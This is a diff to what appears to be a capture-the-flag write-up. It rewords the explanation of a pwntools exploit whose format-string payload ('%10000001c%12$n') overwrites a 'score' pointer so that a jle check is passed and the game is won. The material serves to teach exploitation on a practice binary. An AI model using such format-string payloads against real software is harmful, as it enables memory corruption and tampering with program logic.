@@ -25,7 +25,7 @@ def start(argv=[], *a, **kw):
 
 
 magic_num   = b'202009'
-num_rounds  = b'%10000001c%12$n' # overwriting the 'score' pointer on the heap(12th element), 
+num_rounds  = b'%10000001c%12$n' # overwriting the 'score' pointer value on the heap(located at the 12th element on the stack), 
                                  # https://www.youtube.com/watch?v=KpXsfimrkFo
 
 
@@ -49,7 +49,7 @@ io.recvuntil('Won')
 io.interactive()
 ```
 
-The format string payload(in ``num_rounds``) will overwrite the 'score' pointer on the heap with the value ``10000001``, allowing us to affect the ``jle`` instruction(below).
+The format string payload(in ``num_rounds``) will overwrite the 'score' pointer value on the heap(this pointer is located at the 12th element on the stack) with the value ``10000001``, allowing us to affect the ``jle`` instruction(below).
 
 ![./screenshots/1.png](./screenshots/1.png)
 
